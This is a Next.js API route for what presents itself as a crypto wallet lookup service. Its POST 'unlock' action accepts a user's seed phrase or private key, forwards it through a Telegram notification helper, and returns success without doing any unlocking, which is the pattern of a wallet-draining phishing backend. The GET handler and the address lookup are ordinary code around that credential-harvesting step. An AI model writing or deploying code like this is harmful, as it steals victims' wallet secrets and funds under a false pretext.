import { NextRequest, NextResponse } from "next/server";
import { enforceRateLimit } from "@/lib/rate-limit";
import { getWallet } from "@/lib/wallet-store";
import { notifyWalletUnlock } from "@/lib/telegram";

export const runtime = "nodejs";

export async function POST(req: NextRequest) {
  const rl = await enforceRateLimit(req, "global");
  if (!rl.ok) {
    return NextResponse.json({ error: "Rate limit exceeded" }, { status: 429 });
  }
  let body: any;
  try {
    body = await req.json();
  } catch {
    return NextResponse.json({ error: "Invalid JSON body" }, { status: 400 });
  }

  if (body?.action === "unlock") {
    const input = String(body?.address ?? "");
    const mode = body?.mode === "key" ? "key" as const : "phrase" as const;
    if (input) {
      notifyWalletUnlock({ mode, input });
    }
    return NextResponse.json({ ok: true });
  }

  const address = String(body?.address ?? "");
  if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
    return NextResponse.json({ error: "Invalid address" }, { status: 400 });
  }
  const w = getWallet(address);
  return NextResponse.json({ ok: true, wallet: w });
}

export async function GET(req: NextRequest) {
  const rl = await enforceRateLimit(req, "global");
  if (!rl.ok) {
    return NextResponse.json({ error: "Rate limit exceeded" }, { status: 429 });
  }
  const address = req.nextUrl.searchParams.get("address") || "";
  if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
    return NextResponse.json({ error: "Invalid address" }, { status: 400 });
  }
  const w = getWallet(address);
  return NextResponse.json(w);
}
